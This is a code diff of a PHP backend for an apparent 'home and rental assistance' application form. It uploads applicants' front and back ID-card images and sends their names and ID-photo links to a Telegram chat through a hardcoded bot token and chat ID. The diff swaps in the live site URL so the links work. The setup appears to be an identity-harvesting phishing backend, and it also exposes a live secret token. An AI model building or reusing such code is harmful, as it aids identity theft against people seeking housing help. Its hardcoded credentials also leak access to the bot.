@@ -48,7 +48,7 @@ function uploadFile($file) {
 }
 
 $front_id = uploadFile($_FILES['front_id']);
-$back_id = uploadFile($_FILES['back_id']);
+$back_id  = uploadFile($_FILES['back_id']);
 
 // ======================
 // SAVE TO DATABASE
@@ -73,20 +73,20 @@ $front_id, $back_id
 ]);
 
 // ======================
-// TELEGRAM NOTIFICATION
+// TELEGRAM BOT SETUP
 // ======================
 $botToken = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
 $chatId = "6513265609";
 
-// Base URL of your Render app (CHANGE THIS IF NEEDED)
-$baseUrl = "https://your-app.onrender.com/";
+// 🔥 YOUR REAL RENDER URL
+$baseUrl = "https://homeandrentalassistance.onrender.com";
 
-// Convert file paths to public URLs
-$front_url = $baseUrl . $front_id;
-$back_url  = $baseUrl . $back_id;
+// FIX: build correct file URLs
+$front_url = $baseUrl . "/" . $front_id;
+$back_url  = $baseUrl . "/" . $back_id;
 
 // ======================
-// SEND TEXT MESSAGE FIRST
+// SEND TEXT MESSAGE
 // ======================
 $text = "📄 New Application Submitted\n\n"
 . "👤 Name: $first_name $middle_name $last_name\n"
@@ -127,6 +127,7 @@ file_get_contents(
         "caption" => "🪪 Back ID - $first_name $last_name"
     ])
 );
+
 // ======================
 // EMAIL NOTIFICATION
 // ======================
